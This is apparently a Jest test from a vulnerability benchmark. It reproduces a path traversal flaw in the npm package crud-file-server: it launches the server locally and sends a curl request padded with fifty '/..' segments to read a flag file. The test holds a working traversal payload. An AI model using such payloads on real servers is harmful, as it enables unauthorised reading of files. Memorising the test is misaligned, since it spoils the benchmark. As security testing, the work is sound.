var execSync = require("child_process").execSync;
afterAll(() => {
  try {
    execSync("fuser -k 8998/tcp");
  } catch (e) {}
});
const path = require("path");
const { sleep } = require("sleep");
const pathToFlag = path.resolve(__dirname, "../flag.html");
function genstr(n) {
  return "/..".repeat(50) + pathToFlag;
}
test("Path Traversal in crud-file-server", (done) => {
  expect.assertions(1);
  const fs = require("fs");
  const sleep = require("sleep");
  const { exec } = require("child_process");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require("child_process");
  try {
    a.execSync("fuser -k 8998/tcp", () => {});
  } catch (e) {}
  let server =
    "node ./node_modules/crud-file-server/bin/crud-file-server -p 8998";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is "http://127.0.0.1:8998${genstr()}"`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
